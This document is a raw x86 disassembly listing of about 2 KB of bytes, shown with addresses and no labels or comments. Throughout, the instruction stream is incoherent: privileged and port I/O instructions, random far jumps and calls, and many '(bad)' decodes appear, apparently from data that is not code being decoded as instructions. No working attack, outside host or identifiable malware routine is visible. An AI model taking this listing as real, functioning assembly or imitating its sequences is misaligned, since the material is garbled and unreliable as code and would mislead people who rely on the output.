  40d5d7:	in     al,0xd8
  40d5d9:	inc    edx
  40d5da:	neg    BYTE PTR [esi]
  40d5dc:	jp     0x40d5ac
  40d5de:	lods   al,BYTE PTR ds:[esi]
  40d5df:	add    BYTE PTR [eax-0x2],bh
  40d5e2:	mov    eax,0x55135ac2
  40d5e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5e8:	add    eax,0xf8b84b8c
  40d5ed:	mov    eax,ds:0xc81513aa
  40d5f2:	pop    ebp
  40d5f3:	icebp  
  40d5f4:	mov    ecx,0xb28b3b6a
  40d5f9:	sti    
  40d5fa:	sbb    BYTE PTR [esi+0x5c],dl
  40d5fd:	or     ecx,ebx
  40d5ff:	inc    edi
  40d600:	and    edx,eax
  40d602:	stc    
  40d603:	iret   
  40d604:	sub    eax,DWORD PTR [edx+0x15]
  40d607:	retf   
  40d608:	ins    BYTE PTR es:[edi],dx
  40d609:	jle    0x40d65d
  40d60b:	loope  0x40d689
  40d60d:	push   ds
  40d60e:	sbb    cl,dh
  40d610:	cmc    
  40d611:	mov    ch,0xb6
  40d613:	jb     0x40d5ae
  40d615:	cmp    eax,0x8619fc11
  40d61a:	es scas eax,DWORD PTR es:[edi]
  40d61c:	iret   
  40d61d:	outs   dx,BYTE PTR ds:[esi]
  40d61e:	xchg   DWORD PTR [ebx+ecx*1+0x34b45a73],ebp
  40d625:	mov    ds:0xd97503d9,al
  40d62a:	cmp    bh,BYTE PTR [eax+0x42]
  40d62d:	dec    eax
  40d62e:	mov    esi,0x91d403e9
  40d633:	pop    ss
  40d634:	mov    ds:0x1946340d,al
  40d639:	imul   ecx,DWORD PTR [edx],0xffffffe3
  40d63c:	pop    es
  40d63d:	pop    ss
  40d63e:	int3   
  40d63f:	sub    dl,BYTE PTR [ecx-0x1e]
  40d642:	call   0xd17:0x41b9d8a
  40d649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d64a:	shl    DWORD PTR [esi-0x5cb7ce2],0x89
  40d651:	les    ecx,FWORD PTR [edx-0x375c05a1]
  40d657:	jecxz  0x40d667
  40d659:	push   0x11
  40d65b:	popa   
  40d65c:	aam    0xa7
  40d65e:	inc    eax
  40d65f:	xor    eax,0x5ad8fef5
  40d664:	or     eax,0x5d21531
  40d669:	cmp    al,0x3a
  40d66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d66c:	and    al,0xff
  40d66e:	add    BYTE PTR [edx+0x4cfb626b],ah
  40d674:	and    BYTE PTR [eax-0x21],ch
  40d677:	(bad)  
  40d678:	jns    0x40d694
  40d67a:	xor    BYTE PTR [eax+0x35],0xc
  40d67e:	jle    0x40d6d0
  40d680:	cli    
  40d681:	outs   dx,BYTE PTR ds:[esi]
  40d682:	jmp    0x40d635
  40d684:	mov    DWORD PTR [ecx],edi
  40d686:	jns    0x40d6f8
  40d688:	scas   eax,DWORD PTR es:[edi]
  40d689:	call   0xc97f:0x2918cd3c
  40d690:	mov    bh,0x50
  40d692:	or     edx,ebp
  40d694:	and    ah,BYTE PTR [ebp*1+0x6900c9d9]
  40d69b:	retf   0x4e9a
  40d69e:	mov    bh,0xac
  40d6a0:	es xchg ebp,eax
  40d6a2:	test   BYTE PTR [ecx-0x778e6233],bh
  40d6a8:	mov    ebx,0x6d9e530c
  40d6ad:	leave  
  40d6ae:	mov    esp,0x6d90810f
  40d6b3:	cmp    BYTE PTR [ecx],0x2a
  40d6b6:	in     eax,0x97
  40d6b8:	cmp    eax,0x2fc4853c
  40d6bd:	and    eax,0xc64f47bd
  40d6c2:	test   eax,0xd0c44592
  40d6c7:	jmp    0xab62:0xa087bf62
  40d6ce:	ins    DWORD PTR es:[edi],dx
  40d6cf:	test   BYTE PTR [esp+ebp*4],ah
  40d6d2:	or     cl,dl
  40d6d4:	es nop
  40d6d6:	aaa    
  40d6d7:	sbb    bh,cl
  40d6d9:	in     al,dx
  40d6da:	mov    ebp,0xa9d7883b
  40d6df:	pop    ebx
  40d6e0:	xchg   DWORD PTR [ecx],ecx
  40d6e2:	outs   dx,BYTE PTR ds:[esi]
  40d6e3:	ins    BYTE PTR es:[edi],dx
  40d6e4:	mov    ebp,0x8ccc24ab
  40d6e9:	jno    0x40d765
  40d6eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6ec:	jmp    0x40d711
  40d6ee:	jp     0x40d6fd
  40d6f0:	fiadd  DWORD PTR [esp+edi*4-0x4a]
  40d6f4:	cli    
  40d6f5:	cwde   
  40d6f6:	jne    0x40d6f8
  40d6f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6f9:	stos   DWORD PTR es:[edi],eax
  40d6fa:	les    esi,FWORD PTR [eax]
  40d6fc:	fstp   TBYTE PTR [esi+edi*8+0x200f2411]
  40d703:	jl     0x40d778
  40d705:	lods   eax,DWORD PTR ds:[esi]
  40d706:	fsub   st,st(2)
  40d708:	jge    0x40d73b
  40d70a:	mov    esp,0x33f47c7c
  40d70f:	cli    
  40d710:	xchg   DWORD PTR [ecx-0x656e2753],ebp
  40d716:	not    DWORD PTR [edx+0x420aac8d]
  40d71c:	add    cl,BYTE PTR [ebp-0x5f]
  40d71f:	clc    
  40d720:	dec    edi
  40d721:	mov    ecx,DWORD PTR [ecx-0x10]
  40d724:	and    eax,0x452dc7c2
  40d729:	std    
  40d72a:	jge    0x40d6cf
  40d72c:	pop    edi
  40d72d:	jecxz  0x40d721
  40d72f:	push   ds
  40d730:	cmp    ch,BYTE PTR [ecx-0x4b494c76]
  40d736:	jne    0x40d742
  40d738:	push   ebx
  40d739:	push   ss
  40d73a:	lock add cl,BYTE PTR [esi]
  40d73d:	inc    edi
  40d73e:	lea    esi,[esp+ebx*1-0xff1d6cb]
  40d745:	jo     0x40d718
  40d747:	adc    BYTE PTR [ebx+0x17],0x90
  40d74b:	jp     0x40d709
  40d74d:	dec    ecx
  40d74e:	mov    ds:0x6f276667,eax
  40d753:	sub    BYTE PTR ds:0x2a8c991,bh
  40d759:	sub    dh,BYTE PTR [eax]
  40d75b:	add    BYTE PTR [ecx],0x35
  40d75e:	sbb    ebp,esp
  40d760:	test   BYTE PTR [edx+0x1c3a9863],cl
  40d766:	mov    ?,WORD PTR [eax]
  40d768:	mov    al,0x63
  40d76a:	inc    ecx
  40d76b:	or     DWORD PTR [ebx-0x30d8743c],eax
  40d771:	loopne 0x40d7dc
  40d773:	iret   
  40d774:	push   si
  40d776:	push   ss
  40d777:	xchg   ebp,eax
  40d778:	sbb    al,0x4
  40d77a:	push   es
  40d77b:	dec    ebp
  40d77c:	and    ch,BYTE PTR [eax]
  40d77e:	jle    0x40d771
  40d780:	pop    ecx
  40d781:	mov    ah,0xf6
  40d783:	cwde   
  40d784:	push   ss
  40d785:	stos   DWORD PTR es:[edi],eax
  40d786:	adc    bh,BYTE PTR [ebx]
  40d788:	mov    ebx,0xfe891156
  40d78d:	bnd jne 0x40d75d
  40d790:	fld    TBYTE PTR [esi-0x1c]
  40d793:	mov    al,ds:0xfb1624b0
  40d798:	xor    al,0x77
  40d79a:	stc    
  40d79b:	sti    
  40d79c:	jmp    0xf0fa:0x9c70c058
  40d7a3:	mov    cl,BYTE PTR [esp+edi*8-0x534f494f]
  40d7aa:	(bad)  
  40d7ab:	pop    esp
  40d7ac:	jb     0x40d78d
  40d7ae:	jnp    0x40d75f
  40d7b0:	ins    BYTE PTR es:[edi],dx
  40d7b1:	ret    
  40d7b2:	loop   0x40d7ac
  40d7b4:	stc    
  40d7b5:	dec    edx
  40d7b6:	jno    0x40d819
  40d7b8:	mov    ds:0x2a17bc1e,eax
  40d7bd:	call   0x6a050d7a
  40d7c2:	dec    ebx
  40d7c3:	add    BYTE PTR [esi-0x7d7d8ddd],0xb3
  40d7ca:	xlat   BYTE PTR ds:[ebx]
  40d7cb:	loopne 0x40d766
  40d7cd:	jmp    0x1dd3:0x77979595
  40d7d4:	jns    0x40d7e4
  40d7d6:	push   eax
  40d7d7:	in     eax,dx
  40d7d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7d9:	add    al,0xc5
  40d7db:	mov    ebx,DWORD PTR [ecx+0x2153e663]
  40d7e1:	js     0x40d7f2
  40d7e3:	pop    ecx
  40d7e4:	push   esp
  40d7e5:	repnz pop edx
  40d7e7:	adc    dl,BYTE PTR [ecx]
  40d7e9:	aas    
  40d7ea:	xor    eax,0x35c63b45
  40d7ef:	jns    0x40d788
  40d7f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7f2:	fucomp st(5)
  40d7f4:	jg     0x40d864
  40d7f6:	test   al,0x58
  40d7f8:	(bad)  
  40d7f9:	jmp    0x40d856
  40d7fb:	xor    BYTE PTR [esp+eax*4-0x6ab7f87d],bl
  40d802:	pop    esp
  40d803:	or     al,0xe5
  40d805:	xor    ah,BYTE PTR [eax+0x2eca92e6]
  40d80b:	fisub  WORD PTR [edx+0x1fc481f2]
  40d811:	pop    edi
  40d812:	mov    ebx,0x93309531
  40d817:	cmp    DWORD PTR [eax+0x6cb17415],ebp
  40d81d:	and    esp,DWORD PTR cs:[eax+ebx*4-0x65f09e0c]
  40d825:	test   BYTE PTR [edx+esi*2],0x39
  40d829:	shr    DWORD PTR [eax+0x638dc2be],cl
  40d82f:	loopne 0x40d85f
  40d831:	mov    DWORD PTR [eax+0x4a],edx
  40d834:	pop    esp
  40d835:	cmp    esp,DWORD PTR ds:0xb914d017
  40d83b:	mov    cl,0xea
  40d83d:	movhps QWORD PTR [esi+0x69],xmm0
  40d841:	inc    esi
  40d842:	test   eax,0xd9e08dfe
  40d847:	in     eax,dx
  40d848:	pop    ebx
  40d849:	mov    ebx,0x8cfb467c
  40d84e:	adc    BYTE PTR [eax+0x31],0x5
  40d852:	les    ecx,FWORD PTR [esp+ebp*1+0x1d05bc39]
  40d859:	pop    ebx
  40d85a:	(bad)  [ebp-0x2d3366fe]
  40d860:	xchg   edx,eax
  40d861:	xchg   edi,eax
  40d862:	sar    BYTE PTR [eax+esi*8-0xa1fa574],0xe8
  40d86a:	ds stos BYTE PTR es:[edi],al
  40d86c:	pop    edx
  40d86d:	mov    al,0x13
  40d86f:	xor    bl,BYTE PTR [edx+0x733fdbb]
  40d875:	sti    
  40d876:	or     esi,DWORD PTR ds:0xd7743e1e
  40d87c:	ja     0x40d854
  40d87e:	dec    ebx
  40d87f:	sub    BYTE PTR [ecx-0x1a],dl
  40d882:	jbe    0x40d837
  40d884:	or     al,0xc4
  40d886:	jle    0x40d8af
  40d888:	gs aas 
  40d88a:	sub    dh,dl
  40d88c:	push   ebx
  40d88d:	jo     0x40d823
  40d88f:	leave  
  40d890:	xchg   BYTE PTR [ebp+0x54],bl
  40d893:	xchg   esp,eax
  40d894:	mov    esi,0x46f1dfcc
  40d899:	jo     0x40d8b3
  40d89b:	sbb    ch,dl
  40d89d:	popf   
  40d89e:	cmp    DWORD PTR [eax],edi
  40d8a0:	and    esp,DWORD PTR [ecx-0x7a942c5e]
  40d8a6:	les    ebp,FWORD PTR [ebx+ecx*4+0x64]
  40d8aa:	xchg   esp,eax
  40d8ab:	out    dx,eax
  40d8ac:	lea    esp,[ebx]
  40d8ae:	add    ebp,DWORD PTR [edx+0x1ed6aea0]
  40d8b4:	inc    edx
  40d8b5:	pop    ss
  40d8b6:	stc    
  40d8b7:	lea    esp,[esi+0x4d]
  40d8ba:	icebp  
  40d8bb:	cmp    eax,0x676aba7b
  40d8c0:	cs out 0x9a,eax
  40d8c3:	cdq    
  40d8c4:	test   BYTE PTR [ebx],0x8e
  40d8c7:	pop    ebp
  40d8c8:	mov    DWORD PTR [ecx+esi*1-0x3803e778],eax
  40d8cf:	mov    al,0xc4
  40d8d1:	dec    ebx
  40d8d3:	es sbb DWORD PTR ds:[ecx+0x33ac83cc],edi
  40d8db:	lock imul esp,DWORD PTR [eax-0x31],0x97003266
  40d8e3:	retf   
  40d8e4:	enter  0x92ee,0x65
  40d8e8:	dec    edx
  40d8e9:	ror    DWORD PTR [eax-0x61f75f0c],cl
  40d8ef:	inc    ebx
  40d8f0:	imul   esp,DWORD PTR [ebp+0x15],0xfffffff0
  40d8f4:	push   es
  40d8f5:	in     al,dx
  40d8f6:	ds jmp 0xc96:0x3283e699
  40d8fe:	loop   0x40d909
  40d900:	std    
  40d901:	call   0xe3c30150
  40d906:	mov    dh,0xc5
  40d908:	inc    edi
  40d909:	(bad)  
  40d90a:	jmp    0x40d8e0
  40d90c:	sub    eax,0x916ee94
  40d911:	add    eax,0x92ffde3a
  40d916:	neg    edi
  40d918:	addr16 jmp 0x4b82:0x7f76e53d
  40d920:	(bad)  
  40d921:	cli    
  40d922:	dec    edx
  40d923:	mov    al,0x5c
  40d925:	std    
  40d926:	(bad)  [ebp+0xd]
  40d929:	popf   
  40d92a:	add    edi,DWORD PTR [esi+0x24]
  40d92d:	sbb    BYTE PTR [edi],dh
  40d92f:	stc    
  40d930:	lock mov bl,0x3f
  40d933:	retf   
  40d934:	retf   
  40d935:	cdq    
  40d936:	add    eax,0xe743ee0d
  40d93b:	jns    0x40d8c5
  40d93d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d93e:	pop    ecx
  40d93f:	arpl   WORD PTR [ebp-0x6b],bp
  40d942:	ins    DWORD PTR es:[edi],dx
  40d943:	mov    al,0x8
  40d945:	aad    0x69
  40d947:	jecxz  0x40d92a
  40d949:	out    0x1c,eax
  40d94b:	xor    eax,DWORD PTR [ecx+0x15a114b1]
  40d951:	adc    al,0xfe
  40d953:	(bad)  
  40d954:	call   0xae7e7dda
  40d959:	jmp    0x3b64:0xa3edfd8
  40d960:	jmp    0x40d919
  40d962:	test   al,0x5b
  40d964:	dec    ebp
  40d965:	fnstcw WORD PTR [esi+esi*4]
  40d968:	aad    0x10
  40d96a:	and    DWORD PTR [esi+0x38],eax
  40d96d:	mov    edi,0x3f5f0eee
  40d972:	mov    esi,0x8f23cda2
  40d977:	vmread ebp,eax
  40d97a:	scas   al,BYTE PTR es:[edi]
  40d97b:	push   esi
  40d97c:	adc    al,0x6e
  40d97e:	jne    0x40d9e2
  40d980:	fbstp  TBYTE PTR [eax+0x1c64ee96]
  40d986:	sub    eax,0x18c3cd4f
  40d98b:	xor    eax,ecx
  40d98d:	lock inc esi
  40d98f:	sbb    ah,BYTE PTR ds:0x37c569cf
  40d995:	ficom  DWORD PTR [esi+0x4706b65f]
  40d99b:	stc    
  40d99c:	add    edi,esi
  40d99e:	add    al,0xc3
  40d9a0:	push   edi
  40d9a1:	cmp    cl,0x47
  40d9a4:	test   al,0xc3
  40d9a6:	mov    ds:0x5e884244,al
  40d9ab:	push   cs
  40d9ac:	mov    esi,0x469fa46
  40d9b1:	push   eax
  40d9b2:	adc    BYTE PTR [eax],cl
  40d9b4:	enter  0x9881,0xec
  40d9b8:	jbe    0x40da2c
  40d9ba:	mov    ds,WORD PTR [edx]
  40d9bc:	or     edx,esp
  40d9be:	add    dl,BYTE PTR [eax-0x46]
  40d9c1:	mov    esp,0xdcb6e169
  40d9c6:	pop    ebp
  40d9c7:	push   esi
  40d9c8:	idiv   ch
  40d9ca:	(bad)  
  40d9cb:	imul   edi,DWORD PTR [edx-0x6c89560b],0x3e
  40d9d2:	(bad)  
  40d9d3:	adc    DWORD PTR [esp+ebp*2-0x3e348d3d],0xffffffda
  40d9db:	lods   eax,DWORD PTR ds:[esi]
  40d9dc:	xchg   BYTE PTR [ebp+0x52],ch
  40d9df:	test   al,0x8a
  40d9e1:	xchg   edi,eax
  40d9e2:	xor    al,0x6f
  40d9e4:	lea    ebx,[edi+ecx*1-0x6e57bd54]
  40d9eb:	and    eax,DWORD PTR [edi-0xb]
  40d9ee:	add    BYTE PTR [edi-0x74234685],bh
  40d9f4:	out    dx,eax
  40d9f5:	mov    ebp,0xc9953e4c
  40d9fa:	(bad)  
  40d9fb:	invd   
  40d9fd:	inc    ecx
  40d9fe:	shl    DWORD PTR [ecx+0xbf3e002],1
  40da04:	xchg   BYTE PTR [ecx+0x27b7edbb],dl
  40da0a:	sbb    bl,BYTE PTR ds:0xc98a179e
  40da10:	or     ebp,DWORD PTR [esi-0x7a316110]
  40da16:	jmp    0xf655:0x41b02dbb
  40da1d:	shl    DWORD PTR [edx+0x41],1
  40da20:	pop    ecx
  40da21:	sbb    esp,DWORD PTR [ebp+0x7d]
  40da24:	je     0x40da06
  40da26:	xlat   BYTE PTR ds:[ebx]
  40da27:	mov    bl,0x48
  40da29:	sub    cl,BYTE PTR [edx-0x7d07afd5]
  40da2f:	adc    DWORD PTR [edx-0x78],edi
  40da32:	dec    dh
  40da34:	ret    0x5d3b
  40da37:	cmp    ebx,DWORD PTR [edi]
  40da39:	mov    eax,0x552ec748
  40da3e:	dec    ebp
  40da3f:	fisub  WORD PTR [esi+0x2cbb505]
  40da45:	ret    0xcba1
  40da48:	mov    ds:0x14e3f933,al
  40da4d:	into   
  40da4e:	pop    ebx
  40da4f:	ror    BYTE PTR [esi+ecx*1-0x1c],0xb9
  40da54:	ins    BYTE PTR es:[edi],dx
  40da55:	or     dh,ah
  40da57:	retf   
  40da58:	outs   dx,BYTE PTR ds:[esi]
  40da59:	mov    ds:0x4d00dfcd,al
  40da5e:	xchg   bl,bh
  40da60:	js     0x40da79
  40da62:	jge    0x40daca
  40da64:	push   ebx
  40da65:	mov    edi,0xc0cf84a9
  40da6a:	xor    eax,eax
  40da6c:	ror    DWORD PTR [ecx-0xf997be2],cl
  40da72:	sbb    eax,0x72e807ea
  40da77:	fcmovnb st,st(3)
  40da79:	xchg   DWORD PTR [esp+ecx*2-0x37688a97],ebp
  40da80:	dec    esp
  40da81:	push   edx
  40da82:	jmp    0xf754:0x5d1aa47c
  40da89:	dec    edi
  40da8a:	in     al,dx
  40da8b:	out    dx,al
  40da8c:	cmp    eax,0xf0db1300
  40da91:	scas   al,BYTE PTR es:[edi]
  40da92:	addr16 in eax,dx
  40da94:	retf   0xf499
  40da97:	xlat   BYTE PTR ds:[ebx]
  40da98:	retf   0x1626
  40da9b:	sahf   
  40da9c:	xchg   DWORD PTR [ecx-0x4eeb54b5],ebp
  40daa2:	out    dx,al
  40daa3:	ret    
  40daa4:	imul   ebx,DWORD PTR [ebx-0x41a04bbc],0xffffffce
  40daab:	bound  esi,QWORD PTR [edi]
  40daad:	push   eax
  40daae:	fwait
  40daaf:	mov    cl,BYTE PTR [ebp+0x79dc10e9]
  40dab5:	mov    cl,0x84
  40dab7:	mov    edx,0x77782e33
  40dabc:	(bad)  
  40dabd:	(bad)  
  40dabf:	fadd   st,st(0)
  40dac1:	gs jecxz 0x40db27
  40dac4:	mov    edx,0x9e2ce879
  40dac9:	out    0x64,eax
  40dacb:	sbb    BYTE PTR [ecx],0x33
  40dace:	nop
  40dacf:	and    esi,DWORD PTR [edi-0x2067df8a]
  40dad5:	adc    DWORD PTR [ecx-0x3f],edx
  40dad8:	mov    edi,0xecf83ef3
  40dadd:	mov    BYTE PTR [edx+0x6338c212],al
  40dae3:	ja     0x40dae7
  40dae5:	int3   
  40dae6:	dec    edx
  40dae7:	cs push ebp
  40dae9:	jp     0x40dac6
  40daeb:	mov    ds:0xd3a326ac,eax
  40daf0:	pop    ds
  40daf1:	add    BYTE PTR [edx-0x42],cl
  40daf4:	comiss xmm1,DWORD PTR [eax]
  40daf7:	or     BYTE PTR [ebp-0x3211fa6c],dl
  40dafd:	or     esi,DWORD PTR [eax+ebp*8-0x70b39fad]
  40db04:	or     BYTE PTR [ecx-0x4210655d],ah
  40db0a:	inc    eax
  40db0b:	popa   
  40db0c:	add    eax,0xe4859cae
  40db11:	(bad)  [ebp+0x627dd1]
  40db17:	xchg   ebx,eax
  40db18:	es jb  0x40db14
  40db1b:	stos   DWORD PTR es:[edi],eax
  40db1c:	jae    0x40db13
  40db1e:	fdivr  QWORD PTR [ebp-0x73]
  40db21:	xor    ecx,DWORD PTR [eax]
  40db23:	loop   0x40db65
  40db25:	fmul   QWORD PTR ds:0x4dfeefcd
  40db2b:	dec    edx
  40db2c:	push   ds
  40db2d:	ins    DWORD PTR es:[edi],dx
  40db2e:	mov    ebp,0xc1bf5207
  40db33:	inc    ebp
  40db34:	into   
  40db35:	retf   0x4c6c
  40db38:	imul   edi,DWORD PTR [ebx-0x64],0x4f
  40db3c:	mov    DWORD PTR [ebp-0x32],esp
  40db3f:	push   cs
  40db40:	sbb    eax,ebp
  40db42:	xchg   BYTE PTR [ecx-0x22],ah
  40db45:	mov    ebp,0xe1dc5f18
  40db4a:	jge    0x40db34
  40db4c:	push   edi
  40db4d:	js     0x40db66
  40db4f:	sub    BYTE PTR [edx],bh
  40db51:	mov    DWORD PTR [esi],eax
  40db53:	out    dx,al
  40db54:	mov    eax,ds:0xf41d7e94
  40db59:	rcl    ebp,cl
  40db5b:	push   esp
  40db5c:	inc    ecx
  40db5d:	mov    dl,0x4f
  40db5f:	es dec ebp
  40db61:	jbe    0x40dbc8
  40db63:	adc    BYTE PTR [eax+0x20dd4de3],0xfc
  40db6a:	xor    esi,DWORD PTR [esi-0x2a169a10]
  40db70:	push   edx
  40db71:	dec    edi
  40db72:	and    DWORD PTR [edi-0x6c],esi
  40db75:	cmp    DWORD PTR cs:[ebx-0x344a1479],ecx
  40db7c:	shl    BYTE PTR [eax+eax*2-0x53c335b7],1
  40db83:	icebp  
  40db84:	shl    BYTE PTR [edi],1
  40db86:	mov    ds:0x171b89f7,al
  40db8b:	mov    esi,0xc98ab1b8
  40db90:	sub    ebx,ebx
  40db92:	push   esp
  40db93:	bound  edi,QWORD PTR [eax-0x23]
  40db96:	unpckhps xmm5,XMMWORD PTR [edx+0x64]
  40db9a:	cli    
  40db9b:	mov    edi,0x9b0bdb19
  40dba0:	aaa    
  40dba1:	inc    eax
  40dba2:	pop    ebx
  40dba3:	push   0xe1075cb
  40dba8:	sti    
  40dba9:	or     eax,0x3ace8ede
  40dbae:	(bad)  
  40dbaf:	bound  esp,QWORD PTR ds:[ebx]
  40dbb2:	repz dec ebx
  40dbb4:	jp     0x40db49
  40dbb6:	jecxz  0x40db52
  40dbb8:	loopne 0x40dbbe
  40dbba:	add    eax,ebx
  40dbbc:	pop    es
  40dbbd:	rol    DWORD PTR [edi],cl
  40dbbf:	push   ds
  40dbc0:	jo     0x40db93
  40dbc2:	fcomp  QWORD PTR [ecx-0x3b]
  40dbc5:	fld    DWORD PTR [ebx]
  40dbc7:	cli    
  40dbc8:	push   ss
  40dbc9:	das    
  40dbca:	xchg   esp,eax
  40dbcb:	lock push esi
  40dbcd:	fwait
  40dbce:	pusha  
  40dbcf:	xchg   esi,eax
  40dbd0:	test   BYTE PTR [ebp+0x4d3aa5c3],ah
  40dbd6:	inc    ebp
  40dbd7:	sub    bl,cl
  40dbd9:	jae    0x40dc3e
  40dbdb:	jns    0x40db6a
  40dbdd:	sbb    DWORD PTR gs:[ecx+0x18],ebp
  40dbe1:	add    DWORD PTR [edi-0x5074b0cf],ecx
  40dbe7:	ins    DWORD PTR es:[edi],dx
  40dbe8:	scas   eax,DWORD PTR es:[edi]
  40dbe9:	push   esi
  40dbea:	repnz mov al,0x5e
  40dbed:	and    al,0xb7
  40dbef:	leave  
  40dbf0:	cmp    al,0xb6
  40dbf2:	sbb    eax,0x38ea1a60
  40dbf7:	sahf   
  40dbf8:	add    dh,BYTE PTR [eax-0x1fa08bbc]
  40dbfe:	mov    si,0xc83a
  40dc02:	pop    esp
  40dc03:	pop    ds
  40dc04:	or     edx,eax
  40dc06:	rcr    BYTE PTR [ecx-0x61aa99ef],0xb8
  40dc0d:	cdq    
  40dc0e:	mov    eax,ds:0x97957191
  40dc13:	popf   
  40dc14:	and    al,0x87
  40dc16:	mov    bl,0xd1
  40dc18:	dec    ecx
  40dc19:	sub    al,0x2e
  40dc1b:	in     al,0x83
  40dc1d:	inc    esp
  40dc1e:	jecxz  0x40dbbf
  40dc20:	sub    DWORD PTR [ecx],esp
  40dc22:	aad    0x0
  40dc24:	fwait
  40dc25:	cmp    dl,BYTE PTR ss:[eax]
  40dc28:	sub    al,0xe3
  40dc2a:	mov    DWORD PTR [esi],edi
  40dc2c:	sub    bl,ch
  40dc2e:	sub    al,0x8
  40dc30:	push   eax
  40dc31:	sti    
  40dc32:	jmp    0xcca49089
  40dc37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc38:	xor    BYTE PTR [edi-0x1a9713cb],ch
  40dc3e:	dec    ecx
  40dc3f:	xchg   ebx,eax
  40dc40:	xor    edx,edi
  40dc42:	jg     0x40dc6f
  40dc44:	lds    esp,FWORD PTR [esp+ecx*2+0x2cfacb60]
  40dc4b:	pushf  
  40dc4c:	mov    ebp,0x942cdf78
  40dc51:	fnstsw WORD PTR [ecx-0x3ee8d62]
  40dc57:	test   ah,ch
  40dc59:	cdq    
  40dc5a:	inc    ecx
  40dc5b:	mov    edx,0x59bb4806
  40dc60:	mov    eax,0xd27b34db
  40dc65:	push   cs
  40dc66:	mov    eax,0x9c82c43a
  40dc6b:	xchg   ebx,eax
  40dc6c:	sbb    DWORD PTR [ebx-0x632c9814],0xca7abd29
  40dc76:	sahf   
  40dc77:	xchg   BYTE PTR [edi-0x3e],ah
  40dc7a:	xchg   ebp,eax
  40dc7b:	push   cs
  40dc7c:	shr    BYTE PTR ds:0xefc7e774,cl
  40dc82:	dec    ebp
  40dc83:	loope  0x40dc16
  40dc85:	pop    esi
  40dc86:	and    BYTE PTR [esi+0x50],0xb6
  40dc8a:	or     al,0x18
  40dc8c:	icebp  
  40dc8d:	cmp    ecx,ecx
  40dc8f:	loopne 0x40dcb1
  40dc91:	in     eax,0xe4
  40dc93:	cwde   
  40dc94:	sub    BYTE PTR [eax+ebp*8],dl
  40dc97:	push   ebx
  40dc98:	pop    ss
  40dc99:	gs es dec esi
  40dc9c:	es dec ebx
  40dc9e:	cmp    al,0x11
  40dca0:	push   edi
  40dca1:	jg     0x40dccc
  40dca3:	sub    eax,0xd79a5cc2
  40dca8:	jno    0x40dcb8
  40dcaa:	xor    DWORD PTR [ebp-0x2a3b4ebf],edi
  40dcb0:	push   esp
  40dcb1:	stc    
  40dcb2:	gs pop edi
  40dcb4:	sub    BYTE PTR [ebp-0x2993bae0],al
  40dcba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcbb:	mov    al,0xbf
  40dcbd:	or     BYTE PTR [eax+0x77c62508],al
  40dcc3:	(bad)  
  40dcc4:	outs   dx,BYTE PTR cs:[esi]
  40dcc6:	add    esp,edx
  40dcc8:	mov    bl,0xf1
  40dcca:	adc    eax,0x320eaa2
  40dccf:	xor    DWORD PTR [esi-0xa732d0c],0x89c6004
  40dcd9:	das    
  40dcda:	cli    
  40dcdb:	ret    0xdb21
  40dcde:	xor    eax,0x15b076bb
  40dce3:	sub    ah,BYTE PTR [esi]
  40dce5:	xchg   ebp,eax
  40dce6:	fstp   QWORD PTR [edx+0x2]
  40dce9:	cmp    bh,dl
  40dceb:	and    al,0xbc
  40dced:	mov    bh,bh
  40dcef:	in     eax,0x83
  40dcf1:	mov    ch,0x84
  40dcf3:	xchg   esp,eax
  40dcf4:	enter  0xc7d6,0x1a
  40dcf8:	inc    edx
  40dcf9:	pop    edx
  40dcfa:	das    
  40dcfb:	sbb    cl,BYTE PTR [edi+edx*2+0x4399601b]
  40dd02:	mov    edi,0xb75e12c4
  40dd07:	(bad)  
  40dd08:	jmp    0x198ca61
  40dd0d:	cmp    eax,0xe7827827
  40dd12:	dec    edx
  40dd13:	sbb    dh,BYTE PTR [ebp+0x71e5536f]
  40dd19:	dec    esi
  40dd1a:	cs jae 0x40dd69
  40dd1d:	xchg   edx,eax
  40dd1e:	das    
  40dd1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd20:	stos   DWORD PTR es:[edi],eax
  40dd21:	xchg   ecx,eax
  40dd22:	aam    0x2e
  40dd24:	mov    eax,0xa2c9ab37
  40dd29:	xchg   edx,eax
  40dd2a:	cmc    
  40dd2b:	mov    ch,0x1b
  40dd2d:	cmp    DWORD PTR [edx+ebx*8+0x32931de0],edx
  40dd34:	ins    BYTE PTR es:[edi],dx
  40dd35:	adc    BYTE PTR [eax],al
  40dd37:	sbb    bh,BYTE PTR [edx-0x44]
  40dd3a:	ror    BYTE PTR [eiz*8-0x6badfcbe],1
  40dd41:	mov    esp,esi
  40dd43:	or     al,0xe5
  40dd45:	sbb    eax,0xe5e6bf46
  40dd4a:	or     BYTE PTR [ebp-0x2f],ah
  40dd4d:	jnp    0x40dd16
  40dd4f:	push   edx
  40dd50:	push   ss
  40dd51:	add    eax,0x51875f6c
  40dd56:	xor    dl,0xf5
  40dd59:	and    al,0x7e
  40dd5b:	adc    BYTE PTR [esi+ebp*1],bh
  40dd5e:	ds std 
  40dd60:	mov    DWORD PTR ds:0x8328aa64,edx
  40dd66:	into   
  40dd67:	jb     0x40dd8d
  40dd69:	adc    esi,DWORD PTR [edx-0x30]
  40dd6c:	cmp    bh,dh
  40dd6e:	aaa    
  40dd6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd70:	fwait
  40dd71:	mov    ?,WORD PTR [ecx+0x79]
  40dd74:	push   edi
  40dd75:	jge    0x40dd9c
  40dd77:	pop    ss
  40dd78:	jb     0x40dd9a
  40dd7a:	push   ebp
  40dd7b:	mov    al,ds:0xefd81142
  40dd80:	mov    ds,edi
  40dd82:	mov    ds:0x5ddf03c0,eax
  40dd87:	(bad)  
  40dd88:	cdq    
  40dd89:	push   edi
  40dd8a:	lahf   
  40dd8b:	add    DWORD PTR [edi-0x70],ebp
  40dd8e:	imul   bl
  40dd90:	pop    ecx
  40dd91:	(bad)  
  40dd92:	lea    esi,[eax]
